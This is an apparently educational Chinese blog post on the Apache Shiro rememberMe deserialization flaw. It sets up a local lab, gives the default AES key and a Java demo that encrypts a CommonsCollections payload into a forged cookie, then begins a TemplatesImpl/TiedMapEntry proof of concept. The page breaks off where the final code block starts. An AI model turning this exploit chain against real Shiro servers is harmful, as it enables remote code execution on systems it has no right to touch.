@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title class="pjax-title">[Java安全] Shiro反序列化漏洞 - Huamang&#39;s Blog</title><meta name="Description" content="Huamang&#39;s Blog"><meta property="og:title" content="[Java安全] Shiro反序列化漏洞" />
+<meta property="og:description" content="测试环境搭建我这里用的是P牛的JavaThings，这里有一个Maven构建的非常简易的Shiro的应用 这里用idea打开，然后构建Mave" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://example.com/shiro1/" /><meta property="og:image" content="https://example.com/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-10-03T22:30:52+08:00" />
+<meta property="article:modified_time" content="2022-10-03T22:30:52+08:00" /><meta property="og:site_name" content="Huamang&#39;s Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://example.com/logo.png"/>
+
+<meta name="twitter:title" content="[Java安全] Shiro反序列化漏洞"/>
+<meta name="twitter:description" content="测试环境搭建我这里用的是P牛的JavaThings，这里有一个Maven构建的非常简易的Shiro的应用 这里用idea打开，然后构建Mave"/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://example.com/shiro1/" /><link rel="prev" href="https://example.com/cc3/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "[Java安全] Shiro反序列化漏洞",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/example.com\/shiro1\/"
+        },"image": ["https:\/\/example.com\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  2698 ,
+        "url": "https:\/\/example.com\/shiro1\/","datePublished": "2022-10-03T22:30:52+08:00","dateModified": "2022-10-03T22:30:52+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/example.com\/images\/avatar.png",
+                    "width":  320 ,
+                    "height":  320 
+                }},"author": {
+                "@type": "Person",
+                "name": "Huamang"
+            },"description": ""
+    }
+    </script></head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark');}
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('dark' === 'light' || 'dark' === 'dark' || 'dark' === 'black') setTheme('dark'), saveTheme('dark'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Huamang&#39;s Blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span>Huamang&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/friends/"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><a href="#" onclick="return false;" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" title="Select Language" id="language-select-desktop" onchange="location = this.value;"><option value="/shiro1/" selected>简体中文</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Huamang&#39;s Blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span>Huamang&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="#" onclick="return false;" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/friends/" title="">友链</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="#" onclick="return false;" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" title="Select Language" onchange="location = this.value;"><option value="/shiro1/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content always-active" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#测试环境搭建">测试环境搭建</a></li>
+    <li><a href="#shiro反序列化">Shiro反序列化</a>
+      <ul>
+        <li><a href="#简介">简介</a></li>
+        <li><a href="#构建思路">构建思路</a></li>
+        <li><a href="#构造poc">构造POC</a></li>
+      </ul>
+    </li>
+    <li><a href="#总结">总结</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle", "normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[Java安全] Shiro反序列化漏洞</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="/" title="Author" rel=" author" class="author">Huamang</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/java/"><i class="far fa-folder fa-fw"></i>Java</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-10-03">2022-10-03</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2022-10-03">2022-10-03</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2698 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 6 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#测试环境搭建">测试环境搭建</a></li>
+    <li><a href="#shiro反序列化">Shiro反序列化</a>
+      <ul>
+        <li><a href="#简介">简介</a></li>
+        <li><a href="#构建思路">构建思路</a></li>
+        <li><a href="#构造poc">构造POC</a></li>
+      </ul>
+    </li>
+    <li><a href="#总结">总结</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="测试环境搭建" class="headerLink">
+    <a href="#%e6%b5%8b%e8%af%95%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" class="header-mark"></a>测试环境搭建</h1><p>我这里用的是P牛的<a href="https://github.com/phith0n/JavaThings" target="_blank" rel="noopener noreferrer">JavaThings</a>，这里有一个Maven构建的非常简易的Shiro的应用</p>
+<p>这里用idea打开，然后构建Maven项目，构建好以后简历一个Tomcat服务器就可以使用了</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221004093212167.png" title="image-20221004093212167" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221004093212167.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221004093212167.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221004093212167.png, https://tuchuang.huamang.xyz/img/image-20221004093212167.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221004093212167.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221004093212167.png">
+    </a></p>
+<p>直接访问localhost:8080</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221004093230061.png" title="image-20221004093230061" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221004093230061.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221004093230061.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221004093230061.png, https://tuchuang.huamang.xyz/img/image-20221004093230061.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221004093230061.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221004093230061.png">
+    </a></p>
+<p>我找了好久没找到相关的登录代码逻辑，后来发现，这个项目根本没写，只是在shiro.ini文件里写了就够了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="o">[</span><span class="n">main</span><span class="o">]</span>
+<span class="n">shiro</span><span class="o">.</span><span class="na">loginUrl</span> <span class="o">=</span> <span class="o">/</span><span class="n">login</span><span class="o">.</span><span class="na">jsp</span>
+
+<span class="o">[</span><span class="n">users</span><span class="o">]</span>
+<span class="err">#</span> <span class="n">format</span><span class="o">:</span> <span class="n">username</span> <span class="o">=</span> <span class="n">password</span><span class="o">,</span> <span class="n">role1</span><span class="o">,</span> <span class="n">role2</span><span class="o">,</span> <span class="o">...,</span> <span class="n">roleN</span>
+<span class="n">root</span> <span class="o">=</span> <span class="n">secret</span><span class="o">,</span><span class="n">admin</span>
+<span class="n">guest</span> <span class="o">=</span> <span class="n">guest</span><span class="o">,</span><span class="n">guest</span>
+
+<span class="o">[</span><span class="n">roles</span><span class="o">]</span>
+<span class="err">#</span> <span class="n">format</span><span class="o">:</span> <span class="n">roleName</span> <span class="o">=</span> <span class="n">permission1</span><span class="o">,</span> <span class="n">permission2</span><span class="o">,</span> <span class="o">...,</span> <span class="n">permissionN</span>
+<span class="n">admin</span> <span class="o">=</span> <span class="o">*</span>
+
+<span class="o">[</span><span class="n">urls</span><span class="o">]</span>
+<span class="err">#</span> <span class="n">The</span> <span class="o">/</span><span class="n">login</span><span class="o">.</span><span class="na">jsp</span> <span class="n">is</span> <span class="n">not</span> <span class="n">restricted</span> <span class="n">to</span> <span class="n">authenticated</span> <span class="nf">users</span> <span class="o">(</span><span class="n">otherwise</span> <span class="n">no</span> <span class="n">one</span> <span class="n">could</span> <span class="n">log</span> <span class="n">in</span><span class="o">!),</span> <span class="n">but</span>
+<span class="err">#</span> <span class="n">the</span> <span class="err">&#39;</span><span class="n">authc</span><span class="err">&#39;</span> <span class="n">filter</span> <span class="n">must</span> <span class="n">still</span> <span class="n">be</span> <span class="n">specified</span> <span class="k">for</span> <span class="n">it</span> <span class="n">so</span> <span class="n">it</span> <span class="n">can</span> <span class="n">process</span> <span class="n">that</span> <span class="n">url</span><span class="err">&#39;</span><span class="n">s</span>
+<span class="err">#</span> <span class="n">login</span> <span class="n">submissions</span><span class="o">.</span> <span class="n">It</span> <span class="n">is</span> <span class="err">&#39;</span><span class="n">smart</span><span class="err">&#39;</span> <span class="n">enough</span> <span class="n">to</span> <span class="n">allow</span> <span class="n">those</span> <span class="n">requests</span> <span class="n">through</span> <span class="n">as</span> <span class="n">specified</span> <span class="n">by</span> <span class="n">the</span>
+<span class="err">#</span> <span class="n">shiro</span><span class="o">.</span><span class="na">loginUrl</span> <span class="n">above</span><span class="o">.</span>
+<span class="o">/</span><span class="n">login</span><span class="o">.</span><span class="na">jsp</span> <span class="o">=</span> <span class="n">authc</span>
+<span class="o">/</span><span class="n">logout</span> <span class="o">=</span> <span class="n">logout</span>
+<span class="o">/**</span> <span class="o">=</span> <span class="n">user</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>我们用root/secret登录，勾选上rememberme，登录进去就可以看到有rememberMe的cookie了</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221004100809578.png" title="image-20221004100809578" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221004100809578.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221004100809578.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221004100809578.png, https://tuchuang.huamang.xyz/img/image-20221004100809578.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221004100809578.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221004100809578.png">
+    </a></p>
+<h1 id="shiro反序列化" class="headerLink">
+    <a href="#shiro%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" class="header-mark"></a>Shiro反序列化</h1><h2 id="简介" class="headerLink">
+    <a href="#%e7%ae%80%e4%bb%8b" class="header-mark"></a>简介</h2><p>为了让浏览器或服务器重 启后用户不丢失登录状态，Shiro支持将持久化信息序列化并加密后保存在Cookie的rememberMe字 段中，下次读取时进行解密再反序列化。但是在Shiro 1.2.4版本之前内置了一个<strong>默认且固定的加密 Key</strong>，导致攻击者可以伪造任意的rememberMe Cookie，进而触发反序列化漏洞。</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221004110620002.png" title="image-20221004110620002" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221004110620002.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221004110620002.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221004110620002.png, https://tuchuang.huamang.xyz/img/image-20221004110620002.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221004110620002.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221004110620002.png">
+    </a></p>
+<blockquote>
+<p>得到rememberMe的cookie值 &ndash;&gt; Base64解码 &ndash;&gt; AES解密 &ndash;&gt; 反序列化</p>
+</blockquote>
+<h2 id="构建思路" class="headerLink">
+    <a href="#%e6%9e%84%e5%bb%ba%e6%80%9d%e8%b7%af" class="header-mark"></a>构建思路</h2><p>那么这样的话，构造POC就非常简单了，只需要base64解码Shiro的key，然后对序列化数据进行AES加密即可得到exp</p>
+<p>比如这个demo</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">org.apache.shiro.crypto.AesCipherService</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.shiro.util.ByteSource</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">attack1</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">payload</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CommonsCollections6</span><span class="o">().</span><span class="na">getPayload</span><span class="o">(</span><span class="s">&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;</span><span class="o">);</span>
+        <span class="n">AesCipherService</span> <span class="n">aes</span> <span class="o">=</span> <span class="k">new</span> <span class="n">AesCipherService</span><span class="o">();</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">key</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="s">&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span><span class="o">);</span>
+        <span class="n">ByteSource</span> <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">aes</span><span class="o">.</span><span class="na">encrypt</span><span class="o">(</span><span class="n">payload</span><span class="o">,</span> <span class="n">key</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">printf</span><span class="o">(</span><span class="n">ciphertext</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>但是这个payload是打不通的，报错了</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221004133800889.png" title="image-20221004133800889" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221004133800889.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221004133800889.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221004133800889.png, https://tuchuang.huamang.xyz/img/image-20221004133800889.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221004133800889.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221004133800889.png">
+    </a></p>
+<p>具体原因是因为不能加载<code>Transformer[]</code>，细节原因不深入探究</p>
+<p>总的来说就是：如果shiro反序列化流中包含<strong>非Java自身的数组</strong>，则会出现无法加载类的错误。这就 解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。</p>
+<p>那么我们如何构造才能避免使用Transformer数组呢，这就用到了前面学的TemplatesImpl</p>
+<p>上一篇文章我们介绍CC3的时候，用到了TemplatesImpl和InvokerTransformer，但是还是需要用到Transformer数组的</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221004115101904.png" title="image-20221004115101904" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221004115101904.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221004115101904.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221004115101904.png, https://tuchuang.huamang.xyz/img/image-20221004115101904.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221004115101904.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221004115101904.png">
+    </a></p>
+<p>这里有一篇博客介绍到了一个方法去绕过：<a href="https://www.anquanke.com/post/id/192619" target="_blank" rel="noopener noreferrer">wh1s3p1g</a></p>
+<p>这里就涉及到了我们<a href="https://blog.huamang.xyz/cc6/#cc6" target="_blank" rel="noopener noreferrer">CC6</a>的一个关键类<code>TiedMapEntry</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">TiedMapEntry</span> <span class="kd">implements</span> <span class="n">Entry</span><span class="o">,</span> <span class="n">KeyValue</span><span class="o">,</span> <span class="n">Serializable</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">long</span> <span class="n">serialVersionUID</span> <span class="o">=</span> <span class="o">-</span><span class="n">8453869361373831205L</span><span class="o">;</span>
+    <span class="kd">private</span> <span class="kd">final</span> <span class="n">Map</span> <span class="n">map</span><span class="o">;</span>
+    <span class="kd">private</span> <span class="kd">final</span> <span class="n">Object</span> <span class="n">key</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="nf">TiedMapEntry</span><span class="o">(</span><span class="n">Map</span> <span class="n">map</span><span class="o">,</span> <span class="n">Object</span> <span class="n">key</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">map</span> <span class="o">=</span> <span class="n">map</span><span class="o">;</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">key</span> <span class="o">=</span> <span class="n">key</span><span class="o">;</span>
+    <span class="o">}</span>
+		<span class="c1">// ...
+</span><span class="c1"></span>    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">getValue</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">map</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">key</span><span class="o">);</span>
+    <span class="o">}</span>
+		<span class="c1">// ...
+</span><span class="c1"></span>    <span class="kd">public</span> <span class="kt">int</span> <span class="nf">hashCode</span><span class="o">()</span> <span class="o">{</span>
+        <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getValue</span><span class="o">();</span>
+        <span class="k">return</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getKey</span><span class="o">()</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">?</span> <span class="n">0</span> <span class="o">:</span> <span class="k">this</span><span class="o">.</span><span class="na">getKey</span><span class="o">().</span><span class="na">hashCode</span><span class="o">())</span> <span class="o">^</span> <span class="o">(</span><span class="n">value</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">?</span> <span class="n">0</span> <span class="o">:</span> <span class="n">value</span><span class="o">.</span><span class="na">hashCode</span><span class="o">());</span>
+    <span class="o">}</span>
+  	<span class="c1">// ...
+</span></code></pre></td></tr></table>
+</div>
+</div><p>我们在分析CC6利用链的时候，我们关注的是<code>this.map.get(this.key);</code>里面map触发get方法，对于里面的key我们只是随便传了个值并没去管他</p>
+<p>由于不能使用数组，所以<code>ChainedTransformer</code>就不能用了，那么这里我们自然也用不上<code>ConstantTransformer</code>了，那么我们就缺少了一个恶意对象和恶意对象参数的连接效果的东西了</p>
+<p>而这里恰好，TiedMapEntry的getValue方法会传入key，如果Map是LazyMap的话，我们会惊喜的发现，key会直接传入，执行transform函数，这个效果就和<code>ConstantTransformer</code>一样的，作为一个恶意对象传递的功能，所以我们只需要把恶意对象传入作为key就可以了</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221004123455407.png" title="image-20221004123455407" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221004123455407.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221004123455407.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221004123455407.png, https://tuchuang.huamang.xyz/img/image-20221004123455407.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221004123455407.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221004123455407.png">
+    </a></p>
+<h2 id="构造poc" class="headerLink">
+    <a href="#%e6%9e%84%e9%80%a0poc" class="header-mark"></a>构造POC</h2><p>那么现在我们就来构造POC了，这里首先是参考前面的CC3利用TemplatesImpl去加载出一个恶意对象</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">TemplatesImpl</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
+<span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_bytecodes&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">clazzBytes</span><span class="o">});</span>
+<span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_name&#34;</span><span class="o">,</span> <span class="s">&#34;HelloTemplatesImpl&#34;</span><span class="o">);</span>
+<span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_tfactory&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>然后这里依然是用CC6的来接，构造faketransformer来防止构造时触发链子，但是和CC6的不一样，不能用ChainedTransformer了，所以得手动构造个无害transformer对象</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">Transformer</span> <span class="n">fakeTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">1</span><span class="o">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>然后就是加上CC6的链子了，具体看代码注释</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
